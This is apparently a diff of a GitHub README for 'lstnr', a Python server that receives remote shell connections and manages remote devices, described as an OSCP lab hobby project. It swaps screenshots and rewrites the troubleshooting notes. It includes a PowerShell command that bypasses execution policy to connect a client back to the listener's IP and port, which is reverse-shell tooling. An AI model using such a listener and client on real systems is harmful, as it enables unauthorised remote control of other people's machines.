@@ -3,8 +3,6 @@ Python server that receives shell connections from remote devices.
 
 Remote devices can be managed from a Command Line Interface (CLI)
 
-<img width="666" alt="Screenshot 2025-01-03 at 6 36 01 PM" src="https://github.com/user-attachments/assets/9f1a5adb-3981-42cb-9855-3d847ec16c53" />
-
 # DISCLAIMER
 This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies
 
@@ -26,13 +24,14 @@ This is only for testing purposes, not intended for anything illegal. I was test
         - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
 
 # Screenshot examples:
-- Client connects to <LSTNR_SERVER>
-<img width="702" alt="Screenshot 2025-01-04 at 10 49 03 PM" src="https://github.com/user-attachments/assets/c3027a17-1340-4f64-ac6c-776046003fd9" />
 
-- LSTNR Server catches connection, and is able to manage remote device
-<img width="722" alt="Screenshot 2025-01-04 at 10 48 47 PM" src="https://github.com/user-attachments/assets/4725cf8a-4ab0-47b7-9d36-acf0e5256f99" />
+![windows-kali](https://github.com/user-attachments/assets/d3d4bae8-014c-4e3b-bf83-112939eb8250)
 
+![windows-curl](https://github.com/user-attachments/assets/7e52e3f0-0c24-4f8f-a7da-739802ed4170)
 
 # TROUBLESHOOTING
-- If you are having issues getting the username and hostname, please use `conquer.py`
-    - `conquer.py` is the same script as `lstnr.py` however, it doesn't do anything fancy. It allows remote command execution, with responses.
+- If you are having issues closing the LSTNR
+```
+ps aux | grep lstnr
+kill -9 <PID>
+```
